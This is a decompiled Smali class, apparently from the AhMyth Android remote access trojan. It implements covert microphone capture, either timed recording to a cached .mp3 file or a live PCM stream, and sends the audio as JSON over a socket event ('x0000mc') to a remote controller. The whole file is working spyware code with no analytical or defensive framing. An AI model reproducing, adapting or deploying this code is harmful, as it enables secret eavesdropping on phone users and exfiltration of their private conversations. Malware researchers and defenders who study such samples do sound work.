.class public Lahmyth/mine/king/ahmyth/g;
.super Ljava/lang/Object;
.source ""


# static fields
.field static a:Landroid/media/MediaRecorder;

.field static b:Ljava/io/File;

.field static c:Ljava/util/TimerTask;

.field static d:Landroid/media/AudioRecord;

.field static e:Ljava/lang/Thread;

.field static f:Z

.field static g:I


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method static synthetic a(Ljava/io/File;)V
    .locals 0

    invoke-static {p0}, Lahmyth/mine/king/ahmyth/g;->b(Ljava/io/File;)V

    return-void
.end method

.method private static b(Ljava/io/File;)V
    .locals 6

    invoke-virtual {p0}, Ljava/io/File;->length()J

    move-result-wide v0

    long-to-int v1, v0

    new-array v0, v1, [B

    :try_start_0
    new-instance v2, Ljava/io/BufferedInputStream;

    new-instance v3, Ljava/io/FileInputStream;

    invoke-direct {v3, p0}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v2, v3}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V

    const/4 v3, 0x0

    invoke-virtual {v2, v0, v3, v1}, Ljava/io/BufferedInputStream;->read([BII)I

    new-instance v1, Lorg/json/JSONObject;

    invoke-direct {v1}, Lorg/json/JSONObject;-><init>()V

    const-string v4, "file"

    const/4 v5, 0x1

    invoke-virtual {v1, v4, v5}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v4, "name"

    invoke-virtual {p0}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object p0

    invoke-virtual {v1, v4, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string p0, "buffer"

    invoke-virtual {v1, p0, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lahmyth/mine/king/ahmyth/e;->a()Lahmyth/mine/king/ahmyth/e;

    move-result-object p0

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/e;->b()Lb/a/b/e;

    move-result-object p0

    const-string v0, "x0000mc"

    new-array v4, v5, [Ljava/lang/Object;

    aput-object v1, v4, v3

    invoke-virtual {p0, v0, v4}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;

    invoke-virtual {v2}, Ljava/io/BufferedInputStream;->close()V
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_2
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Lorg/json/JSONException;->printStackTrace()V

    goto :goto_0

    :catch_1
    move-exception p0

    invoke-virtual {p0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0

    :catch_2
    move-exception p0

    invoke-virtual {p0}, Ljava/io/FileNotFoundException;->printStackTrace()V

    :goto_0
    return-void
.end method

.method public static c(I)V
    .locals 1

    const/4 v0, -0x1

    if-ne p0, v0, :cond_0

    invoke-static {}, Lahmyth/mine/king/ahmyth/g;->h()V

    return-void

    :cond_0
    invoke-static {p0}, Lahmyth/mine/king/ahmyth/g;->i(I)V

    return-void
.end method

.method private static i(I)V
    .locals 4

    invoke-static {}, Lahmyth/mine/king/ahmyth/MainService;->getContextOfApplication()Landroid/content/Context;

    move-result-object v0

    invoke-virtual {v0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v0

    :try_start_0
    const-string v1, "DIRR"

    invoke-virtual {v0}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-static {v1, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    const-string v1, "sound"

    const-string v2, ".mp3"

    invoke-static {v1, v2, v0}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v0

    sput-object v0, Lahmyth/mine/king/ahmyth/g;->b:Ljava/io/File;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    new-instance v0, Landroid/media/MediaRecorder;

    invoke-direct {v0}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/g;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    sget-object v0, Lahmyth/mine/king/ahmyth/g;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x2

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    sget-object v0, Lahmyth/mine/king/ahmyth/g;->a:Landroid/media/MediaRecorder;

    const/4 v1, 0x3

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    sget-object v0, Lahmyth/mine/king/ahmyth/g;->a:Landroid/media/MediaRecorder;

    sget-object v1, Lahmyth/mine/king/ahmyth/g;->b:Ljava/io/File;

    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    sget-object v0, Lahmyth/mine/king/ahmyth/g;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->prepare()V

    sget-object v0, Lahmyth/mine/king/ahmyth/g;->a:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->start()V

    new-instance v0, Lahmyth/mine/king/ahmyth/g$a;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/g$a;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/g;->c:Ljava/util/TimerTask;

    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    sget-object v1, Lahmyth/mine/king/ahmyth/g;->c:Ljava/util/TimerTask;

    mul-int/lit16 p0, p0, 0x3e8

    int-to-long v2, p0

    invoke-virtual {v0, v1, v2, v3}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    return-void

    :catch_0
    const-string p0, "MediaRecording"

    const-string v0, "external storage access error"

    invoke-static {p0, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    return-void
.end method

.method public static d()V
    .locals 2

    const/4 v0, 0x0

    sput-boolean v0, Lahmyth/mine/king/ahmyth/g;->f:Z

    sget-object v0, Lahmyth/mine/king/ahmyth/g;->d:Landroid/media/AudioRecord;

    if-eqz v0, :cond_0

    :try_start_0
    invoke-virtual {v0}, Landroid/media/AudioRecord;->stop()V

    sget-object v0, Lahmyth/mine/king/ahmyth/g;->d:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->release()V

    const/4 v0, 0x0

    sput-object v0, Lahmyth/mine/king/ahmyth/g;->d:Landroid/media/AudioRecord;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    sget-object v0, Lahmyth/mine/king/ahmyth/g;->e:Ljava/lang/Thread;

    if-eqz v0, :cond_1

    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Thread;->join()V
    :try_end_1
    .catch Ljava/lang/InterruptedException; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    const/4 v0, 0x0

    sput-object v0, Lahmyth/mine/king/ahmyth/g;->e:Ljava/lang/Thread;

    :cond_1
    return-void
.end method

.method private static h()V
    .locals 6

    const/4 v0, 0x1

    sput-boolean v0, Lahmyth/mine/king/ahmyth/g;->f:Z

    const v0, 0xac44

    sput v0, Lahmyth/mine/king/ahmyth/g;->g:I

    sget v0, Lahmyth/mine/king/ahmyth/g;->g:I

    const/16 v1, 0x10

    const/4 v2, 0x2

    invoke-static {v0, v1, v2}, Landroid/media/AudioRecord;->getMinBufferSize(III)I

    move-result v0

    mul-int/lit8 v5, v0, 0x2

    const/4 v1, 0x1

    sget v2, Lahmyth/mine/king/ahmyth/g;->g:I

    const/16 v3, 0x10

    const/4 v4, 0x2

    new-instance v0, Landroid/media/AudioRecord;

    invoke-direct/range {v0 .. v5}, Landroid/media/AudioRecord;-><init>(IIIII)V

    sput-object v0, Lahmyth/mine/king/ahmyth/g;->d:Landroid/media/AudioRecord;

    invoke-virtual {v0}, Landroid/media/AudioRecord;->startRecording()V

    new-instance v0, Lahmyth/mine/king/ahmyth/g$b;

    invoke-direct {v0}, Lahmyth/mine/king/ahmyth/g$b;-><init>()V

    sput-object v0, Lahmyth/mine/king/ahmyth/g;->e:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method static synthetic j([B)V
    .locals 0

    invoke-static {p0}, Lahmyth/mine/king/ahmyth/g;->k([B)V

    return-void
.end method

.method private static k([B)V
    .locals 5

    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    invoke-direct {v0}, Lorg/json/JSONObject;-><init>()V

    const-string v1, "pcm"

    const/4 v2, 0x1

    invoke-virtual {v0, v1, v2}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v1, "buffer"

    invoke-virtual {v0, v1, p0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v1, "sampleRate"

    sget v3, Lahmyth/mine/king/ahmyth/g;->g:I

    invoke-virtual {v0, v1, v3}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    invoke-static {}, Lahmyth/mine/king/ahmyth/e;->a()Lahmyth/mine/king/ahmyth/e;

    move-result-object p0

    invoke-virtual {p0}, Lahmyth/mine/king/ahmyth/e;->b()Lb/a/b/e;

    move-result-object p0

    const-string v1, "x0000mc"

    new-array v3, v2, [Ljava/lang/Object;

    const/4 v4, 0x0

    aput-object v0, v3, v4

    invoke-virtual {p0, v1, v3}, Lb/a/b/e;->a(Ljava/lang/String;[Ljava/lang/Object;)Lb/a/c/a;
    :try_end_0
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception p0

    invoke-virtual {p0}, Lorg/json/JSONException;->printStackTrace()V

    return-void
.end method
